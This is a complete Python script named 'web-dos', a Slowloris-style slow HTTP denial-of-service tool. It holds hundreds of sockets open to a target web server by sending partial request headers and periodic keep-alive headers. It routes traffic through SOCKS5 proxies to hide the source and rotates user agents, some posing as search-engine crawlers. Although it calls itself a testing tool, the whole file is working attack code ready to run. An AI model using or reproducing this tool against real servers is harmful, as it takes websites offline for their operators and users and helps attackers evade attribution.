#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import ssl
import sys
import time

parser = argparse.ArgumentParser(description="web-dos: Slow HTTP DoS testing tool")
parser.add_argument("host", help="Target host")
parser.add_argument("-p", "--port", type=int, default=80, help="Port (default: 80)")
parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets")
parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
parser.add_argument("-ua", "--randuseragents", action="store_true", help="Random User-Agent")
parser.add_argument("-x", "--useproxy", action="store_true", help="Use SOCKS5 proxy")
parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
parser.add_argument("--proxy-port", type=int, default=8080, help="SOCKS5 proxy port")
parser.add_argument("--https", action="store_true", help="Use HTTPS")
parser.add_argument("--sleeptime", type=int, default=15, help="Sleep time between headers")
args = parser.parse_args()

# Logging
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

# Proxy support
if args.useproxy:
    try:
        import socks
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy")
    except ImportError:
        logging.error("Install PySocks: pip install pysocks")
        sys.exit(1)

# User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 13; SM-A525F)",
    "curl/7.79.1",
    "Wget/1.21",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro)",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
]

# Helper functions
def send_line(sock, line):
    try:
        sock.send(f"{line}\r\n".encode("utf-8"))
    except:
        pass

def send_header(sock, name, value):
    send_line(sock, f"{name}: {value}")

def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((args.host, args.port))
        if args.https:
            context = ssl.create_default_context()
            s = context.wrap_socket(s, server_hostname=args.host)
        ua = random.choice(user_agents) if args.randuseragents else user_agents[0]
        send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
        send_header(s, "Host", args.host)
        send_header(s, "User-Agent", ua)
        send_header(s, "Accept-language", "en-US,en,q=0.5")
        return s
    except Exception as e:
        logging.debug(f"Socket init failed: {e}")
        return None

# Start
list_of_sockets = []

logging.info(f"Attacking {args.host}:{args.port} with {args.sockets} sockets...")
logging.info("Press Ctrl+C to stop the attack.")

# Create sockets
for _ in range(args.sockets):
    s = init_socket()
    if s:
        list_of_sockets.append(s)

# Loop forever
while True:
    try:
        logging.info(f"Sending keep-alive headers... Open sockets: {len(list_of_sockets)}")
        for i, s in enumerate(list_of_sockets[:]):
            try:
                send_header(s, "X-a", str(random.randint(1, 5000)))
            except Exception:
                try:
                    list_of_sockets.remove(s)
                    s_new = init_socket()
                    if s_new:
                        list_of_sockets.append(s_new)
                except:
                    pass
        time.sleep(args.sleeptime)
    except KeyboardInterrupt:
        logging.info("User interrupted. Exiting...")
        break
    except Exception as e:
        logging.debug(f"Main loop error: {e}")
